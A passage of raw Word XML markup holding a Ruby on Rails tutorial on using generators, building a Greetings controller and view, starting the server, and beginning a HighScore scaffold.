        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> command uses templates to create a whole lot of things. Running </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails generate</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> by itself gives a list of available generators:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30369F5B"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You can also use the alias “g” to invoke the generator command: </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails g</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">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5760"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="1E33D94F" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3A8C282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generate</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DECF53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Usage: rails generate GENERATOR [args] [options]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7688671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69E8DAD0"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251F539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3DD60B77"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57829EA2"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Please choose a generator below.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="490C94DA"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02B74D8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Rails:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D26282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controller</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BE05B62"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generator</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="791E93F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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="251E807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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="46247162"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You can install more generators through generator gems, portions of plugins you’ll undoubtedly install, and you can even create your own!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F1E9397"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Using generators will save you a large amount of time by writing </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>boilerplate code</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, code that is necessary for the app to work.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531103A3"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Let’s make our own controller with the controller generator. But what command should we use? Let’s ask the generator:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC560C0"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All Rails console utilities have help text. As with most *nix utilities, you can try adding </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>--help</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>-h</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to the end, for example </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails server --help</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">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8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="04B61901" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="051D8C1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generate controller</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59949FE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Usage: rails generate controller NAME [action action] [options]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35C8492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5FAC036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650BB898"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0DB59D2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0B5B87CA"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Example:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51750BF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generate controller CreditCard open debit credit close</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="125852A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6166ACC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Credit card controller with URLs like /credit_card/debit.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B0004C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Controller: app/controllers/credit_card_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AC4D52A"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Views:      app/views/credit_card/debit.html.erb [...]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C32519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Helper:     app/helpers/credit_card_helper.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7170396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Test:       test/functional/credit_card_controller_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7957562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2690C3F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Modules Example:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1ABA1A8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generate controller 'admin/credit_card' suspend late_fee</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7098209A"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1727AE4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Credit card admin controller with URLs like /admin/credit_card/suspend.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6856B1A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Controller: app/controllers/admin/credit_card_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60E9A91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Views:      app/views/admin/credit_card/debit.html.erb [...]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F096A6A"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Helper:     app/helpers/admin/credit_card_helper.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27445D2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Test:       test/functional/admin/credit_card_controller_test.rb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="58E9F68E"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controller generator is expecting parameters in the form of </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>generate controller ControllerName action1 action2</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. Let’s make a </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Greetings</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> controller with an action of </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hello</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, which will say something nice to us.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="1F2B0E0B" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22A4927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generate controller Greetings hello</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E93696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app/controllers/greetings_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="184022B0"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route  get "greetings/hello"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F7F743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invoke  erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="079AE16A"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app/views/greetings</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BC65B3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app/views/greetings/hello.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63A690F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invoke  test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="081540B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test/functional/greetings_controller_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="326030D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invoke  helper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F3DFD0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app/helpers/greetings_helper.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78209802"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invoke    test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="157473D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test/unit/helpers/greetings_helper_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F8D0DB2"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invoke  assets</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5153328A"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app/assets/javascripts/greetings.js</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FC6BFE8"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invoke    css</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06BD171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app/assets/stylesheets/greetings.css</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="51C6832D"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What all did this generate? It made sure a bunch of directories were in our application, and created a controller file, a view file, a functional test file, a helper for the view, a javascript file and a stylesheet file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A3449E"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Check out the controller and modify it a little (in </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/controllers/greetings_controller.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">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5880"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="0638501D" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D8C311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class</w:t>
            </w:r>
            <w:r w:rsidRPr="0091039A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="0091039A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>GreetingsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6645564A"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def</w:t>
            </w:r>
            <w:r w:rsidRPr="0091039A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="0091039A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>hello</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D0C4188"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@message</w:t>
            </w:r>
            <w:r w:rsidRPr="0091039A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="0091039A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= "Hello, how are you today?"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A3AC06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end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AF4A3B0"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end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="39660C5A"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Then the view, to display our message (in </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/greetings/hello.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">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3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="4439A548" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1AF4ABC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&lt;h1&gt;A Greeting for You!&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="376F4F1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&lt;p&gt;&lt;%= @message %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="72868E06"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Fire up your server using </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">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2520"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="46AC1998" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F03785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server</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="332C545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=&gt; Booting WEBrick...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="535EB874"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Make sure that you do not have any “tilde backup” files in </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/(controller)</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, or else WEBrick will </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> show the expected output. This seems to be a </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bug</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in Rails 2.3.0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D72AFB"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URL will be </w:t>
      </w:r>
      <w:hyperlink r:id="rId904" w:history="1">
        <w:r w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://localhost:3000/greetings/hello</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2098CE28"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With a normal, plain-old Rails application, your URLs will generally follow the pattern of http://(host)/(controller)/(action), and a URL like http://(host)/(controller) will hit the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action of that controller.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21298875"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Rails comes with a generator for data models too.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="5739E7AA" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5164C59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generate model</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21FE4BCA"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Usage: rails generate model NAME [field:type field:type] [options]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33AE54D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41FA328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3671E84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4AE9715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Examples:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78AF011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generate model account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CCA6077"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2AE3B89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Model:      app/models/account.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D2CEFA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Test:       test/unit/account_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FF2334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Fixtures:   test/fixtures/accounts.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49A7112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Migration:  db/migrate/XXX_add_accounts.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="294ABD0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3342423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generate model post title:string body:text published:boolean</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FF2B97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6DC26F6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Creates a Post model with a string title, text body, and published flag.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="637945CA"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For a list of available field types, refer to the </w:t>
      </w:r>
      <w:hyperlink r:id="rId905" w:anchor="method-i-column" w:history="1">
        <w:r w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>API documentation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the column method for the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>TableDefinition</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> class.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E7738D7"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But instead of generating a model directly (which we’ll be doing later), let’s set up a scaffold. A </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>scaffold</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in Rails is a full set of model, database migration for that model, controller to manipulate it, views to view and manipulate the data, and a test suite for each of the above.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECC5D81"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We will set up a simple resource called “HighScore” that will keep track of our highest score on video games we play.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8160"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="308B4198" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="012C100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generate scaffold HighScore game:string score:integer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1270BC0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exists  app/models/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09EA5BA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exists  app/controllers/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7ECB8F8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exists  app/helpers/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="624D9BB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app/views/high_scores</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="565BE57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app/views/layouts/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E7FF21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exists  test/functional/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D76EB4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test/unit/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="462C6F2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app/assets/stylesheets/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31B16178"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app/views/high_scores/index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CF50FC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app/views/high_scores/show.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="606C628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app/views/high_scores/new.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="390C7EE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app/views/high_scores/edit.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F6E388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app/views/layouts/high_scores.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="327BFC4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app/assets/stylesheets/scaffold.css.scss</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="598AB43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app/controllers/high_scores_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3931970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test/functional/high_scores_controller_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E7C901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app/helpers/high_scores_helper.rb</w:t>
            </w:r>
          </w:p>
